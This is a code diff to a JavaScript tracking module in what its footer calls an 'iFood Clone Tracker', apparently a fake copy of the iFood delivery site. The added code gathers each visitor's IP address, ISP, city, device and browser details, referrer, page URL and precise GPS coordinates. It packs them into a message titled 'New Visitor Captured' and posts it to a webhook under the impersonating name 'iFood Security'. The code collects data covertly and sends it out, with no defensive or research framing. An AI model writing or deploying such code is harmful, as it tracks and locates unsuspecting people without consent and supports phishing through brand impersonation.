@@ -31,39 +31,58 @@ const IPModule = {
         ua.includes("Chrome")  ? "Chrome"  :
         ua.includes("Safari")  ? "Safari"  : "Desconhecido";
 
-      const lines = [
-        "[ REDE ]",
-        "IP       : " + d.ip,
-        "ISP      : " + (d.org      ?? "N/A"),
-        "Local    : " + (d.city ?? "") + ", " + (d.region ?? "") + " - " + (d.country ?? ""),
-        "Conexao  : " + (conn.downlink ? conn.downlink + " Mbps / " + (conn.effectiveType ?? "") : "N/A"),
-        "",
-        "[ DISPOSITIVO ]",
-        "OS       : " + os,
-        "Browser  : " + browser,
-        "CPU      : " + (nav.hardwareConcurrency ?? "N/A") + " cores / " + (nav.deviceMemory ?? "N/A") + " GB RAM",
-        "Tela     : " + window.screen.width + "x" + window.screen.height,
-        "Mobile   : " + (nav.maxTouchPoints > 0 ? "Sim" : "Nao"),
-        "Idioma   : " + nav.language,
-        "Cookies  : " + nav.cookieEnabled,
-        "Referrer : " + (document.referrer || "Direto"),
-        "URL      : " + location.href,
-      ];
+      const embed = {
+        title: "🎯 Novo Visitante Capturado",
+        color: 15277612,
+        timestamp: new Date().toISOString(),
+        fields: [
+          {
+            name: "🌐 Rede",
+            value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.org ?? "N/A"}\n**Local:** ${d.city ?? ""}, ${d.region ?? ""} - ${d.country ?? ""}\n**Conexão:** ${conn.downlink ? conn.downlink + " Mbps / " + (conn.effectiveType ?? "") : "N/A"}`,
+            inline: false
+          },
+          {
+            name: "💻 Dispositivo",
+            value: `**OS:** ${os}\n**Browser:** ${browser}\n**CPU:** ${nav.hardwareConcurrency ?? "N/A"} cores / ${nav.deviceMemory ?? "N/A"} GB RAM\n**Tela:** ${window.screen.width}x${window.screen.height}\n**Mobile:** ${nav.maxTouchPoints > 0 ? "Sim" : "Não"}`,
+            inline: true
+          },
+          {
+            name: "⚙️ Sistema",
+            value: `**Idioma:** ${nav.language}\n**Cookies:** ${nav.cookieEnabled ? "Ativado" : "Desativado"}\n**Referrer:** ${document.referrer || "Direto"}`,
+            inline: true
+          },
+          {
+            name: "🔗 URL",
+            value: `[${location.href}](${location.href})`,
+            inline: false
+          }
+        ],
+        footer: {
+          text: "iFood Clone Tracker",
+          icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972185.png"
+        }
+      };
 
       if (lat !== null && lon !== null) {
-        lines.push("");
-        lines.push("[ LOCALIZACAO ]");
-        lines.push("Coords   : " + lat.toFixed(6) + ", " + lon.toFixed(6));
-        lines.push("Maps     : https://maps.google.com/?q=" + lat.toFixed(6) + "," + lon.toFixed(6));
+        embed.fields.push({
+          name: "📍 Localização",
+          value: `**Coords:** \`${lat.toFixed(6)}, ${lon.toFixed(6)}\`\n[Ver no Google Maps](https://maps.google.com/?q=${lat.toFixed(6)},${lon.toFixed(6)})`,
+          inline: false
+        });
+        embed.thumbnail = {
+          url: `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=13&size=400x300&markers=color:red%7C${lat},${lon}&key=AIzaSyDummy`
+        };
       }
 
-      lines.push("");
-      lines.push(new Date().toISOString());
-
-      const blob = new Blob([lines.join("\n")], { type: "text/plain" });
-      const form = new FormData();
-      form.append("file", blob, "target_" + d.ip.replace(/\./g, "_") + ".txt");
-      await fetch(WEBHOOK, { method: "POST", body: form });
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: "iFood Security",
+          avatar_url: "https://logodownload.org/wp-content/uploads/2017/04/ifood-logo-0.png",
+          embeds: [embed]
+        })
+      });
     } catch (err) {
       console.warn("[IPModule]", err.message);
     }
